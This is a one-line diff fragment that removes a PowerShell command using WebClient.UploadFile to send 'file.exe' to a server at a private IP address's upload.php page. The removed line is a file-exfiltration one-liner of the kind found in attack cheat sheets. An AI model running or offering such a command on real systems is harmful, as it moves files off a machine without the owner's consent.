@@ -1,1 +1,0 @@
-powershell (New-Object System.Net.WebClient).UploadFile('http://10.0.0.90/upload.php', 'file.exe')
